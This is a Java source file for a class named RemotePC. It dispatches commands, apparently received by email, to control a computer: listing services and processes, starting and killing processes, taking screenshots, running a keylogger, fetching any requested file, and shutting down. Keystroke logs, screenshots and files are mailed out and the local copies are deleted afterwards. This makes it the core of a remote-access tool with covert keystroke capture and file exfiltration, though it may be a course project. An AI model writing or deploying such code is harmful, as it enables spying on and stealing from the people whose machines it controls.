package email;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;

import javax.swing.ImageIcon;

public class RemotePC {

  String[] message;
  String fullMessage;
  KeyLog keylog;
  SendMail send;

  public RemotePC(String message, KeyLog keylog, SendMail send) {
    this.fullMessage = message;
    this.message = message.split(":");
    this.keylog = keylog;
    this.send = send;
  }

  private void deleteFile(String path) {
    String filePath = path;

    File file = new File(filePath);

    if (file.exists()) {
      if (file.delete()) {
        System.out.println("Xóa tệp thành công.");
      } else {
        System.out.println("Không thể xóa tệp.");
      }
    } else {
      System.out.println("Tệp không tồn tại.");
    }
  }

  private String readFile(String filename) {
    try {
      FileReader fileReader = new FileReader(filename);
      BufferedReader bufferedReader = new BufferedReader(fileReader);
      String line;
      int count = 0;
      StringBuilder sb = new StringBuilder();
      while ((line = bufferedReader.readLine()) != null && count < 10) {
          sb.append(line).append("\n");
          count++;
      }
      bufferedReader.close();
      fileReader.close();

      String input = sb.toString();
      return "<html>" + input.replace("\n", "<br>") + "</html>";
    } catch (IOException e) {
        return "";
    }
  }

  public String run() {
    ProcessPC process = new ProcessPC();
    ServerThreading.statusRunning = fullMessage;
    switch (message[0]) {
      case "service":
        process.listService();
        ServerThreading.fileDemo = readFile("service.txt");
        if (send.sendFile("service.txt"))
        {
          System.out.println("list service");
          return "service.txt was sent successfully";
        }
        else return "list service failed!";
        //break;
      case "process":
        if (message[1].equals("list")) {
          process.listProcess();
          ServerThreading.fileDemo = readFile("process.txt");
          if (send.sendFile("process.txt"))
          {
            System.out.println("list process");
            return "process.txt was sent successfully";
          }
          else return "list process failed!";
        }
        if (message[1].equals("start")) {
          System.out.println("starting process " + message[2]);
          if (process.startProcess(message[2]))
          {
              return "start process " + message[2] + " successfully";
          }
          else return "start process " + message[2] + " failed";
        }
        if (message[1].equals("stop")) {
          System.out.println("stop process PID " + message[2]);
          if (process.stopProcess(message[2]))
          {
              return "stop process PID " + message[2] + " successfully";
          }
          else return "stop process PID " + message[2] + " failed";
        }
        //break;
      case "screenshot":
        System.out.println(message[1]);
        ScreenShot screen = new ScreenShot(message[1]);
        System.out.println("screenshot suscessfull");
        ServerThreading.screenshotDemo = new ImageIcon(message[1]);
        ServerThreading.fileDemo = "";

        if (send.sendFile(message[1]))
        {
          System.out.println("Send suscessfull");
          deleteFile(message[1]);
          return "screenshot was sent successfully";
        }
        else return "screenshot was not sent successfully";
        //break;
      case "keylog":
        if (message[1].equals("start")) {
          if (this.keylog.isLoging == false) {
            this.keylog.start();
            System.out.println("start keylog");
            return "keylog started";
          } else {
            System.out.println("keylog is already running");
            return "keylog is already running";
          }
        }
        if (message[1].equals("stop")) {
          if (this.keylog.isLoging == true) {
            this.keylog.isLoging = false;
            this.keylog.stop();
            ServerThreading.fileDemo = readFile("keylog.txt");
            if (send.sendFile("keylog.txt"))
            {
              System.out.println("stop keylog");
              deleteFile("keylog.txt");
              return "keylog.txt was sent successfully";
            }
            else return "keylog.txt was not sent successfully";
          } else {
            System.out.println("keylog is not running");
            return "keylog is not running";
          }
        }
        //break;
      case "logout":
        if (message[1].length() > 0){
          if (process.logout(message[1])){
            return "logout successfully";
          }
          else return "logout failed";
        }
        else {
          if (process.shutdown("")){
            return "logout successfully";
          }
          else return "logout failed";
        }
        //break;
      case "shutdown":
        if (message[1].length() > 0){
          if (process.shutdown(message[1])){
            return "shutdown in the next 1 hour";
          }
          else return "shutdown failed";
        }
        else {
          if (process.shutdown("")){
            return "shutdown in the next 1 hour";
          }
          else return "shutdown failed";
        }
        //break;
      case "getfile":
        String path = "";
        for (int i = 1; i < message.length; i++) {
          path += message[i];
          if (i != message.length-1) path += ':';
        }
        if (path.endsWith(".txt")) {
          ServerThreading.fileDemo = readFile(path);
        }
        if (send.sendFile(path))
        {
          System.out.println("get file suscessfull");
          return "Requested file was sent successfully";
        }
        else return "File error!";
        //break;
      default:
        System.out.println("command not found");
        return "Command not found !!!";
        //break;
    }
  }
}